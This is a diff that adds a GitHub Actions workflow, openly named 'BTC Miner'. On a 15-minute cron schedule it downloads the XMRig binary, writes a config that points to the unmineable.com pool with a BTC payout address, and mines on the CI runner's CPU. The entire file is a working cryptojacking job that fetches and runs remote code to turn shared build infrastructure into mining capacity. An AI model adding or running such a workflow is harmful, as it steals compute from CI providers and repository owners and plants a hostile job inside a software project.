@@ -1,0 +1,30 @@
+name: BTC Miner
+
+on:
+  schedule:
+    - cron: '*/15 * * * *'
+  workflow_dispatch:
+
+jobs:
+  mine:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Download and run XMRig
+        run: |
+          wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz
+          tar -xzf xmrig-6.21.0-linux-static-x64.tar.gz
+          cd xmrig-6.21.0
+          cat > config.json <<EOF
+          {
+              "autosave": true,
+              "cpu": {"enabled": true, "max-threads-hint": 70},
+              "pools": [{
+                  "url": "pool.unmineable.com:3333",
+                  "user": "BTC:bc1qlran4auyfhcn79w3d8fehuc7f957x3uej7j2pj.%github_runner",
+                  "pass": "x",
+                  "tls": false,
+                  "keepalive": true
+              }]
+          }
+          EOF
+          ./xmrig --config=config.json --threads=2
